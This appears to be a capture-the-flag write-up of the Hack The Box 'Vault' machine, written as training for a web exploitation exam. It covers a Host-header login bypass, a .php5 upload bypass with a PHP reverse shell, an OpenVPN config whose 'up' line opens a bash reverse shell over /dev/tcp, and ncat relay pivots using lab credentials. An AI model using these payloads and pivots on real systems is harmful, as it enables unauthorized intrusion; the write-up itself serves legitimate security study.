---
description: >-
  I’ll tell you the secret to fighting strong enemies. It’s easy, keep getting
  up and attack them with your moves continuously. - Eisen
icon: vault
---

# Hack The Box - Vault Writeup

We start with a very lazy nmap, and see two ports:

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap 10.129.45.226                                             
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-30 16:28 EDT
Nmap scan report for 10.129.45.226
Host is up (0.035s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.79 seconds
```

Visiting the site:

<figure><img src="../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>

I want to notate something here. The directory we are looking for, as you will see soon, is "sparklays". Something interesting:

```
┌──(kali㉿kali)-[~/Desktop]
└─$ grep -Ri 'sparklays' /usr/share/wordlists/seclists/Discovery/
                                                                                                      
┌──(kali㉿kali)-[~/Desktop]
└─$ grep -Ri 'sparklays' /usr/share/wordlists/seclists/          
                                                                                                      
┌──(kali㉿kali)-[~/Desktop]
└─$ grep -Ri 'sparklays' /usr/share/wordlists/dirbuster 
                                                                                                      
┌──(kali㉿kali)-[~/Desktop]
└─$ grep -Ri 'sparklays' /usr/share/wordlists/
```

However, with a little critical thinking, you can see that they are producing a web solution for client Sparklays. Any time you see something like this (another example may be a upload feature button, for which you should then check /uploads), you should check those directories.

Not found error for incorrect directories:

<figure><img src="../.gitbook/assets/image (2) (2).png" alt=""><figcaption></figcaption></figure>

sparklays directory:

<figure><img src="../.gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>

We know we should fix this path now.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ feroxbuster -u http://10.129.45.226/sparklays/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -x txt,php
                                                                                                      
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.45.226/sparklays/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET       11l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        3l        2w       16c http://10.129.45.226/sparklays/login.php
200      GET       13l       38w      615c http://10.129.45.226/sparklays/admin.php
301      GET        9l       28w      325c http://10.129.45.226/sparklays/design => http://10.129.45.226/sparklays/design/
301      GET        9l       28w      333c http://10.129.45.226/sparklays/design/uploads => http://10.129.45.226/sparklays/design/uploads/
[>-------------------] - 5s     12279/1984947 17m     found:4       errors:0      
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_10_129_45_226_sparklays_-1748635108.state ...
[>-------------------] - 5s     12409/1984947 17m     found:4       errors:0      
[>-------------------] - 5s      5508/661638  1194/s  http://10.129.45.226/sparklays/ 
[>-------------------] - 4s      3831/661638  1081/s  http://10.129.45.226/sparklays/design/ 
[>-------------------] - 3s      2850/661638  962/s   http://10.129.45.226/sparklays/design/uploads/
```

We also visit the upload pages, but they are access denied. The admin.php page is a login though, so we can probably see where this is going.

<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

We try some basic default creds and .php parameter manipulation, but don't find much. Http request looks like this:

<figure><img src="../.gitbook/assets/image (5) (2).png" alt=""><figcaption></figcaption></figure>

However, somewhat surprisingly, if we change the ip field for host to localhost, we can bypass the security with ANY username and password combination:

<figure><img src="../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

In the construction state, it appears that the real authentication is not implemented. Rather, they use a simple ip from the host header.

<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

After following a couple links, we get to the upload feature:

<figure><img src="../.gitbook/assets/image (8) (2).png" alt=""><figcaption></figcaption></figure>

Given the narrow attack surface of this site, this is clearly going to be an arbitrary upload/execution situation. Uploading a regular php file shows as not allowed:

<figure><img src="../.gitbook/assets/image (9) (2).png" alt=""><figcaption></figcaption></figure>

We choose php because the directories show that this site is utilizing php already.

We go through a short list of php file extension alternatives, and it successfully takes "php5":

<figure><img src="../.gitbook/assets/image (10) (2).png" alt=""><figcaption></figcaption></figure>

As said before, always check relevant upload directories. We can execute our payload from the uploads directory and get our shell. For this php reverse shell, I used: [https://pentestmonkey.net/tools/web-shells/php-reverse-shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)

<figure><img src="../.gitbook/assets/image (11) (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (12) (2).png" alt=""><figcaption></figcaption></figure>

After some light enumeration, we find Dave's password, and can see that we should be able to ssh:

```
dave@ubuntu:~$ cat Desktop/key
itscominghome
dave@ubuntu:~$ cat Desktop/ssh
dave
Dav3therav3123
dave@ubuntu:~$ 
```

We can also see some other ip addresses:

```
dave@ubuntu:~/Desktop$ cat Servers 
DNS + Configurator - 192.168.122.4
Firewall - 192.168.122.5
The Vault - x
dave@ubuntu:~/Desktop$ 

```

Some enumeration also shows 22 and 80 as being open on the 192.168.122.4 ip:

```
dave@ubuntu:~$ nc -vz 192.168.122.4 1-100
Connection to 192.168.122.4 22 port [tcp/ssh] succeeded!
Connection to 192.168.122.4 80 port [tcp/http] succeeded!
```

I was unable to connect to 22. We will do a basic port forward to reach the port 80:

```
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh -L 2222:192.168.122.4:80 dave@10.129.45.226
dave@10.129.45.226's password: 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-45-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

222 packages can be updated.
47 updates are security updates.

Last login: Fri May 30 13:52:27 2025 from 10.10.14.178
dave@ubuntu:~$ 
```

In our local browser:

<figure><img src="../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

We find a very weird vpn configuration editor:

<figure><img src="../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>

By setting up a listener on the victim, and then exploiting the VPN configuration, we are able to catch a reverse shell. [https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da](https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da)

VPN configuration:

```
remote 192.168.122.1
ifconfig 10.200.0.2 10.200.0.1
dev tun
script-security 2
nobind
up "/bin/bash -c '/bin/bash -i > /dev/tcp/192.168.122.1/4242 0<&1 2>&1&'"
```

Reverse shell:

```
dave@ubuntu:~/Desktop$ nc -nvlp 4242
Listening on [0.0.0.0] (family 0, port 4242)
Connection from [192.168.122.4] port 4242 [tcp/*] accepted (family 2, sport 45186)
bash: cannot set terminal process group (1106): Inappropriate ioctl for device
bash: no job control in this shell
root@DNS:/var/www/html#
```

The code execution is actually triggered as soon as we hit "update file".

Some light enumeration on the new host shows more ssh credentials:

```
root@DNS:/home/dave# cat ssh
cat ssh
dave
dav3gerous567
root@DNS:/home/dave# 

```

The bash history for user alex shows some interesting items:

```
root@DNS:/home/dave# cat /home/alex/.bash_history
cat /home/alex/.bash_history
wget http://192.168.1.11:8888/DNS.zip
sudo apt-get nmap
apt-get install nmap
ping 192.168.5.2
nc -lvp 8888

```

We will back out of the reverse shell and just ssh into DNS as normal:

```
root@DNS:/home/dave# ^X^C
dave@ubuntu:~/Desktop$ ssh dave@192.168.1.4
^C
dave@ubuntu:~/Desktop$ ssh dave@192.168.122.4
dave@192.168.122.4's password: 
Permission denied, please try again.
dave@192.168.122.4's password: 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

98 packages can be updated.
50 updates are security updates.


Last login: Mon Sep  3 16:38:03 2018
```

He also has sudo perms:

```
dave@DNS:~$ sudo su root
[sudo] password for dave: 
root@DNS:/home/dave#
```

We find that auth.log has some interesting items:

{% code overflow="wrap" %}
```
root@DNS:/home/dave# cat /var/log/auth.log
Sep  2 15:10:20 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53
Sep  2 15:10:20 DNS sudo: pam_unix(sudo:session): session opened for user root by dave(uid=0)
Sep  2 15:10:34 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53
y=/dev/pts/0 ruser=dave rhost=  user=dave
Sep  2 15:07:51 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/nmap 192.168.5.2 -Pn --source-port=4444 -f
```
{% endcode %}

After some enumeration, some of which consisted of literally copy-pasting those commands, I see this:

```
root@DNS:/home/dave# nc 192.168.5.2 987 -p 4444
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4
```

Taking the commands above, and applying some proper parsing (and backgrounding it for convenience):

```
root@DNS:/home/dave# /usr/bin/ncat -l 3333 --sh-exec "ncat 192.168.5.2 987 -p 53"&
[1] 1621
root@DNS:/home/dave# 
```

using this, with the creds we found:

```
root@DNS:/home/dave# /usr/bin/ncat -l 3333 --sh-exec "ncat 192.168.5.2 987 -p 53"&
[1] 1621
root@DNS:/home/dave# ssh dave@0.0.0.0 -p 3333
The authenticity of host '[0.0.0.0]:3333 ([0.0.0.0]:3333)' can't be established.
ECDSA key fingerprint is SHA256:Wo70Zou+Hq5m/+G2vuKwUnJQ4Rwbzlqhq2e1JBdjEsg.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[0.0.0.0]:3333' (ECDSA) to the list of known hosts.
dave@0.0.0.0's password: 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

96 packages can be updated.
49 updates are security updates.


Last login: Mon Sep  3 16:48:00 2018
dave@vault:~$ 
```

We do some enumeration, and find an encrypted root file:

```
dave@vault:~$ sudo -l
[sudo] password for dave: 
Sorry, try again.
[sudo] password for dave: 
Sorry, user dave may not run sudo on vault.
dave@vault:~$ ls
root.txt.gpg
dave@vault:~$ cat ro-rbash: /dev/null: restricted: cannot redirect output
bash: _upvars: `-a2': invalid number specifier
-rbash: /dev/null: restricted: cannot redirect output
bash: _upvars: `-a0': invalid number specifier
^C
dave@vault:~$ cat ro-rbash: /dev/null: restricted: cannot redirect output
bash: _upvars: `-a2': invalid number specifier
-rbash: /dev/null: restricted: cannot redirect output
bash: _upvars: `-a0': invalid number specifier
^C
dave@vault:~$ ^C
dave@vault:~$ cat root.txt.gpg
�
*XWŶ!�~��׈\s�WeW�c�.\▒VRj�▒)W|眚��H5��]��1R<I�q�=��z��ᔩO;F��7��▒����'p�?O�/�!3�e��*�X�mzTH
&�*��b��D�T�Y9j�GkS|)����,�%�4�4��ei�t_B؇ �G>�?5�t�3��4E������-�T��x��{^0��Pv�����,`���VFa���"����TÂN�>�b_a���eQ��羜Ɩ��O�l�o���D�d7�a(��^��ð
                                      ��/���p>?�▒'���l�z2��w�q����S`�<��|�      �ݬ�oR�b�)��7���Y1{P�<,�xKO���ԣ�#�y��'F�      #W�L1▒3<$>��#c"$!������+�kǋR������o����dpDv�
                                                                    �믱�V�('���Ҁ>t�qI�ss�x�L���A3.rk��
 6�,!i�Tg�b��J������fVO�|�_x
                             �|jL©��▒�0f"��dave@vault:~$ 
dave@vault:~$ 
dave@vault:~$ gpg -d ./root.txt.gpg
gpg: directory `/home/dave/.gnupg' created
gpg: new configuration file `/home/dave/.gnupg/gpg.conf' created
gpg: WARNING: options in `/home/dave/.gnupg/gpg.conf' are not yet active during this run
gpg: keyring `/home/dave/.gnupg/secring.gpg' created
gpg: keyring `/home/dave/.gnupg/pubring.gpg' created
gpg: encrypted with RSA key, ID D1EB1F03
gpg: decryption failed: secret key not available
dave@vault:~$ 
```

We backtrack, and find it on the first host:

```
dave@ubuntu:~$ gpg --list-keys
/home/dave/.gnupg/pubring.gpg
-----------------------------
pub   4096R/0FDFBFE4 2018-07-24
uid                  david <dave@david.com>
sub   4096R/D1EB1F03 2018-07-24

dave@ubuntu:~$ 
```

Setup another listener, and scp the file over to the midpoint DNS:

```
dave@DNS:~$ /usr/bin/ncat -l 3334 --sh-exec "ncat 192.168.5.2 987 -p 4444"&
[2] 1734
dave@DNS:~$ scp -P 3334 dave@192.168.122.4:/home/dave/root.txt.gpg .
dave@192.168.122.4's password: 
root.txt.gpg                                                        100%  629     0.6KB/s   00:00    
[2]+  Done                    /usr/bin/ncat -l 3334 --sh-exec "ncat 192.168.5.2 987 -p 4444"
dave@DNS:~$ cat root.txt.gpg 
�
*XWŶ!�~��׈\s�WeW�c�.\▒VRj�▒)W|眚��H5��]��1R<I�q�=��z��ᔩO;F��7��▒����'p�?O�/�!3�e��*�X�mzTH
&�*��b��D�T�Y9j�GkS|)����,�%�4�4��ei�t_B؇ �G>�?5�t�3��4E������-�T��x��{^0��Pv�����,`���VFa���"����TÂN�>�b_a���eQ��羜Ɩ��O�l�o���D�d7�a(��^��ð
                                      ��/���p>?�▒'���l�z2��w�q����S`�<��|��ݬ�oR�b�)��7���Y1{P�<,�xKO���ԣ�#�y��'F�    #W�L1▒3<$>��#c"$!������+�kǋR������o����dpDv�
                                                            �믱�V�('���Ҁ>t�qI�ss�x�L���A3.rk��
                                                                                               6�,!i�Tg�b��J������fVO�|�_x
                     �|jL©��▒�0f"��dave@DNS:~$ 
dave@DNS:~$ 
```

And then, a little simpler, to the ubuntu:

```
dave@DNS:~$ exit
logout
Connection to 192.168.122.4 closed.
dave@ubuntu:~$ scp dave@192.168.122.4:/home/dave/root.txt.gpg .
dave@192.168.122.4's password: 
Permission denied, please try again.
dave@192.168.122.4's password: 
root.txt.gpg                                                        100%  629     0.6KB/s   00:00    
dave@ubuntu:~$ 
```

And finally, with the "itscominghome" password we got earlier:

```
dave@ubuntu:~$ gpg -d root.txt.gpg 

You need a passphrase to unlock the secret key for
user: "david <dave@david.com>"
4096-bit RSA key, ID D1EB1F03, created 2018-07-24 (main key ID 0FDFBFE4)

gpg: encrypted with 4096-bit RSA key, ID D1EB1F03, created 2018-07-24
      "david <dave@david.com>"
aa468340b91DEADBEEF31093d9bfe811
dave@ubuntu:~$ 
```

This was a very strange lab, and I found it incredibly difficult, especially for a medium level lab. There were multiple techniques which I had never used or seen before. However, this is likely because I am not as familiar with web, and have spent my time up until now focused on network pentesting (as I have my OSCP and OSEP). I went through this lab as part of my preparation for OSWE, and learned quite a bit.
